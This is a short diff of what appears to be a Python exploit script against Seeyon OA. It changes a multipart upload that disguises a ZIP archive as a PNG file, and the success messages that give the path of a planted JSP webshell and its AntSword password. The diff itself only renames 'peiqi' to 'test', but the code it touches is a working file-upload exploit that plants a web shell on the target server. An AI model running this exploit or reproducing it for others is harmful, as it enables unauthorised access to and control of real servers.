@@ -73,7 +73,7 @@ Content-Disposition: form-data; name="type"
 
 0
 --59229605f98b8cf290a7b8908b34616b
-Content-Disposition: form-data; name="file1"; filename="peiqi.png"
+Content-Disposition: form-data; name="file1"; filename="test.png"
 Content-Type: image/png
 
 PK....................______
@@ -167,9 +167,9 @@ def POC_2(target_url, cookie, reg, headers):
         response = requests.post(vuln_url, data=post,headers=headers,timeout=60,verify=False)
         if response.status_code == 500:
             print("\033[32m[o] 目标 {} 解压文件成功.... \033[0m".format(target_url))
-            print("\033[32m[o] 默认Webshell地址: {}/seeyon/common/designer/pageLayout/peiqi10086.jsp \033[0m".format(target_url))
-            print("\033[32m[o] 蚁剑密码: peiqi \033[0m".format(target_url))
-            print("\033[32m[o] 如果目标webshell无法访问，请更换 peiqi_test.zip 中的木马名称 \033[0m".format(target_url))
+            print("\033[32m[o] 默认Webshell地址: {}/seeyon/common/designer/pageLayout/test10086.jsp \033[0m".format(target_url))
+            print("\033[32m[o] 蚁剑密码: test \033[0m".format(target_url))
+            print("\033[32m[o] 如果目标webshell无法访问，请更换 shell.zip 中的木马名称 \033[0m".format(target_url))
         else:
                 print("\033[31m[x] 目标 {} 不存在漏洞 \033[0m".format(target_url))
     except Exception as e:
